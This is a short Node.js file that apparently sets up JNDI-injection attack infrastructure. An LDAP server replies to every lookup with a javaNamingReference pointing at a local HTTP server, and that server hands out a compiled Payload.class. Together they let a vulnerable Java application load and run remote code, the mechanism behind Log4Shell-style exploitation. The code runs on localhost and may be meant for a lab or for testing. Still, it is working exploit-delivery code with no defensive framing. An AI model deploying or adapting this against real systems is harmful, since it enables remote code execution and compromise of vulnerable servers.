const http = require('http');
const fs = require('fs');

const httpserver = http.createServer((req, res) => {
    console.log(`${new Date()} Request was made: ${req.url}`);
    const readStream = fs.createReadStream('../NodeServer/payloads/Payload.class');
    readStream.pipe(res);
});
httpserver.listen(5000);
console.log(`Server is running on port ${httpserver.address().port}`);

const ldap = require('ldapjs');

const server = ldap.createServer();

server.search('', (req, res, next) => {
    console.log("LDAP Lookup");

    res.send({
        dn: req.dn.toString(),
        attributes: {
            objectClass: ['javaNamingReference'],
            javaClassName: 'Payload',
            javaFactory: ['Payload'],
            javaCodebase: ['http://localhost:5000/'],
        }
    });
    res.end();
});

server.listen(100, '127.0.0.1', () => {
    console.log('LDAP server listening at %s', server.url);
});